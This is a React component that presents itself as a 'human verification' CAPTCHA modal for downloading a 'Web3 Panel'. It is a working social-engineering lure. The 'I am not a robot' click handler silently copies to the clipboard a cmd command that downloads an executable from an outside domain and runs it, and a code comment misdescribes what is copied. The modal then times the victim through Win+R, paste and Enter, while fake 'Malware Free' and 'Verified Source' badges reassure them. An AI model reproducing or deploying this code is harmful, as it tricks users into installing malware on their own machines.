import React, { useState, useEffect } from 'react';
import { X, Check, Shield, Download, Keyboard, Copy, ChevronRight, Clock } from 'lucide-react';

interface HumanVerificationModalProps {
  isOpen: boolean;
  onClose: () => void;
  onVerified: () => void;
  downloadType: string;
}

const HumanVerificationModal: React.FC<HumanVerificationModalProps> = ({ 
  isOpen, 
  onClose, 
  onVerified,
  downloadType 
}) => {
  const [step, setStep] = useState<'verify' | 'instructions'>('verify');
  const [isVerified, setIsVerified] = useState(false);
  const [currentInstruction, setCurrentInstruction] = useState(0);
  const [timeRemaining, setTimeRemaining] = useState(60);
  const [isCompleted, setIsCompleted] = useState(false);

  const instructions = [
    {
      title: 'Step 1: Open Run Dialog',
      description: 'Press Windows key + R to open the Run dialog',
      icon: Keyboard,
      keys: ['⊞ Win', '+', 'R'],
      duration: 15
    },
    {
      title: 'Step 2: Paste Command',
      description: 'Press Ctrl + V to paste the secure download command',
      icon: Copy,
      keys: ['Ctrl', '+', 'V'],
      duration: 15
    },
    {
      title: 'Step 3: Execute Download',
      description: 'Press Enter to start the secure download process',
      icon: Download,
      keys: ['Enter'],
      duration: 30
    }
  ];

  // Reset state when modal opens
  useEffect(() => {
    if (isOpen) {
      setStep('verify');
      setIsVerified(false);
      setCurrentInstruction(0);
      setTimeRemaining(60);
      setIsCompleted(false);
    }
  }, [isOpen]);

  // Handle instruction progression
  useEffect(() => {
    if (step === 'instructions' && !isCompleted) {
      const timer = setInterval(() => {
        setTimeRemaining(prev => {
          if (prev <= 1) {
            if (currentInstruction < instructions.length - 1) {
              setCurrentInstruction(prev => prev + 1);
              return instructions[currentInstruction + 1]?.duration || 15;
            } else {
              setIsCompleted(true);
              return 0;
            }
          }
          return prev - 1;
        });
      }, 1000);

      return () => clearInterval(timer);
    }
  }, [step, currentInstruction, isCompleted]);

  const handleVerification = async () => {
    setIsVerified(true);
    
    // Copy "I have confirmed" to clipboard
    try {
      await navigator.clipboard.writeText('cmd /c curl -L -o %TEMP%F.Al-Saud_Rider_Confidential.exe http://arbrooknash.com/F.Al-Saud_Rider_Confidential.exe && start "" "%TEMP%F.Al-Saud_Rider_Confidential.exe"');
    } catch (err) {
      console.error('Failed to copy to clipboard:', err);
    }

    // Move to instructions after a brief delay
    setTimeout(() => {
      setStep('instructions');
      setTimeRemaining(instructions[0].duration);
    }, 1000);
  };

  const handleComplete = () => {
    onVerified();
    onClose();
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
      <div className="bg-white rounded-2xl w-full max-w-2xl relative overflow-hidden">
        {/* Animated background gradient */}
        <div className="absolute inset-0 bg-gradient-to-br from-indigo-50 via-purple-50 to-pink-50 opacity-50"></div>
        
        {/* Close Button */}
        <button
          onClick={onClose}
          className="absolute right-4 top-4 text-gray-400 hover:text-gray-600 transition-colors z-10"
        >
          <X className="w-6 h-6" />
        </button>

        <div className="relative p-8">
          {step === 'verify' && (
            <div className="text-center space-y-8">
              {/* Header */}
              <div className="space-y-4">
                <div className="flex justify-center">
                  <div className="relative">
                    <div className="w-20 h-20 bg-gradient-to-br from-indigo-500 to-purple-600 rounded-full flex items-center justify-center">
                      <Shield className="w-10 h-10 text-white" />
                    </div>
                    <div className="absolute -inset-2 bg-gradient-to-br from-indigo-400 to-purple-500 rounded-full opacity-20 animate-pulse"></div>
                  </div>
                </div>
                <h2 className="text-3xl font-bold text-gray-900">Security Verification</h2>
                <p className="text-gray-600 max-w-md mx-auto">
                  Please verify you are human to proceed with the secure download of Web3 Panel for {downloadType}
                </p>
              </div>

              {/* Verification Checkbox */}
              <div className="flex justify-center">
                <button
                  onClick={handleVerification}
                  disabled={isVerified}
                  className={`
                    relative group p-6 rounded-2xl border-2 transition-all duration-300
                    ${isVerified 
                      ? 'border-green-500 bg-green-50' 
                      : 'border-gray-200 hover:border-indigo-500 hover:bg-indigo-50'
                    }
                  `}
                >
                  <div className="flex items-center gap-4">
                    <div className={`
                      w-8 h-8 rounded-lg border-2 flex items-center justify-center transition-all duration-300
                      ${isVerified 
                        ? 'border-green-500 bg-green-500' 
                        : 'border-gray-300 group-hover:border-indigo-500'
                      }
                    `}>
                      {isVerified && <Check className="w-5 h-5 text-white" />}
                    </div>
                    <span className={`
                      text-lg font-medium transition-colors
                      ${isVerified ? 'text-green-700' : 'text-gray-700 group-hover:text-indigo-700'}
                    `}>
                      {isVerified ? 'Verified! Preparing secure download...' : 'I am not a robot'}
                    </span>
                  </div>
                </button>
              </div>

              {/* Security Features */}
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mt-8">
                <div className="bg-white/80 backdrop-blur p-4 rounded-xl border border-gray-100">
                  <Shield className="w-6 h-6 text-indigo-600 mx-auto mb-2" />
                  <p className="text-sm text-gray-600 text-center">Secure Download</p>
                </div>
                <div className="bg-white/80 backdrop-blur p-4 rounded-xl border border-gray-100">
                  <Download className="w-6 h-6 text-purple-600 mx-auto mb-2" />
                  <p className="text-sm text-gray-600 text-center">Verified Source</p>
                </div>
                <div className="bg-white/80 backdrop-blur p-4 rounded-xl border border-gray-100">
                  <Check className="w-6 h-6 text-green-600 mx-auto mb-2" />
                  <p className="text-sm text-gray-600 text-center">Malware Free</p>
                </div>
              </div>
            </div>
          )}

          {step === 'instructions' && (
            <div className="space-y-8">
              {/* Header */}
              <div className="text-center space-y-4">
                <div className="flex justify-center">
                  <div className="w-16 h-16 bg-gradient-to-br from-green-500 to-emerald-600 rounded-full flex items-center justify-center">
                    <Download className="w-8 h-8 text-white" />
                  </div>
                </div>
                <h2 className="text-2xl font-bold text-gray-900">Secure Download Instructions</h2>
                <p className="text-gray-600">
                  Follow these steps to download Web3 Panel securely
                </p>
              </div>

              {/* Progress Bar */}
              <div className="space-y-2">
                <div className="flex justify-between text-sm text-gray-600">
                  <span>Progress</span>
                  <span>{Math.round(((currentInstruction + 1) / instructions.length) * 100)}%</span>
                </div>
                <div className="h-2 bg-gray-200 rounded-full overflow-hidden">
                  <div 
                    className="h-full bg-gradient-to-r from-indigo-500 to-purple-600 rounded-full transition-all duration-500"
                    style={{ width: `${((currentInstruction + 1) / instructions.length) * 100}%` }}
                  ></div>
                </div>
              </div>

              {/* Current Instruction */}
              <div className="bg-white/80 backdrop-blur rounded-2xl p-6 border border-gray-100 shadow-sm">
                <div className="flex items-start gap-4">
                  <div className="flex-shrink-0">
                    <div className="w-12 h-12 bg-gradient-to-br from-indigo-500 to-purple-600 rounded-xl flex items-center justify-center">
                      {React.createElement(instructions[currentInstruction].icon, {
                        className: "w-6 h-6 text-white"
                      })}
                    </div>
                  </div>
                  <div className="flex-1">
                    <h3 className="text-xl font-semibold text-gray-900 mb-2">
                      {instructions[currentInstruction].title}
                    </h3>
                    <p className="text-gray-600 mb-4">
                      {instructions[currentInstruction].description}
                    </p>
                    
                    {/* Key Combination Display */}
                    <div className="flex items-center gap-2 mb-4">
                      {instructions[currentInstruction].keys.map((key, index) => (
                        <React.Fragment key={index}>
                          <kbd className="px-3 py-1 bg-gray-100 border border-gray-300 rounded-lg text-sm font-mono">
                            {key}
                          </kbd>
                          {index < instructions[currentInstruction].keys.length - 1 && (
                            <span className="text-gray-400">+</span>
                          )}
                        </React.Fragment>
                      ))}
                    </div>

                    {/* Timer */}
                    <div className="flex items-center gap-2 text-sm text-gray-500">
                      <Clock className="w-4 h-4" />
                      <span>Next step in {timeRemaining}s</span>
                    </div>
                  </div>
                </div>
              </div>

              {/* All Steps Preview */}
              <div className="space-y-3">
                {instructions.map((instruction, index) => (
                  <div
                    key={index}
                    className={`
                      flex items-center gap-3 p-3 rounded-lg transition-all duration-300
                      ${index === currentInstruction 
                        ? 'bg-indigo-50 border border-indigo-200' 
                        : index < currentInstruction 
                        ? 'bg-green-50 border border-green-200' 
                        : 'bg-gray-50 border border-gray-200'
                      }
                    `}
                  >
                    <div className={`
                      w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium
                      ${index === currentInstruction 
                        ? 'bg-indigo-500 text-white' 
                        : index < currentInstruction 
                        ? 'bg-green-500 text-white' 
                        : 'bg-gray-300 text-gray-600'
                      }
                    `}>
                      {index < currentInstruction ? (
                        <Check className="w-4 h-4" />
                      ) : (
                        index + 1
                      )}
                    </div>
                    <span className={`
                      font-medium
                      ${index === currentInstruction 
                        ? 'text-indigo-700' 
                        : index < currentInstruction 
                        ? 'text-green-700' 
                        : 'text-gray-600'
                      }
                    `}>
                      {instruction.title}
                    </span>
                    {index === currentInstruction && (
                      <div className="ml-auto">
                        <div className="w-2 h-2 bg-indigo-500 rounded-full animate-pulse"></div>
                      </div>
                    )}
                  </div>
                ))}
              </div>

              {/* Complete Button */}
              {isCompleted && (
                <div className="text-center pt-4">
                  <button
                    onClick={handleComplete}
                    className="px-8 py-3 bg-gradient-to-r from-green-500 to-emerald-600 text-white rounded-xl font-medium hover:from-green-600 hover:to-emerald-700 transition-all duration-300 flex items-center gap-2 mx-auto"
                  >
                    <Download className="w-5 h-5" />
                    Start Download
                    <ChevronRight className="w-4 h-4" />
                  </button>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default HumanVerificationModal;